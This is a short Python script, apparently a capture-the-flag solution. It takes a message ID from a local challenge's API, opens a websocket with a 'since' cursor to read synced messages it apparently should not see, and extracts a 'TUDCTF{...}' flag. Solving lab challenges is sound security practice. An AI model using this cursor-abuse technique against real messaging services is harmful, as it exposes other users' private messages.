import requests
from websockets.sync.client import connect
import json
import re

url = "127.0.0.1:8080"

s = requests.session()

res = s.get(f"http://{url}/api/messages").json()
cursor = res['messages'][0]['id']

with connect(f"ws://{url}/ws?since={cursor}") as ws:
    sync = ws.recv()
    msgs = json.loads(sync)['records']

    for msg in msgs:
        if msg['type'] != "message":
            continue

        res = re.search("TUDCTF\\{\\w+\\}", msg['text'])
        if res is None:
            continue
        
        print(res.group())
        exit(0)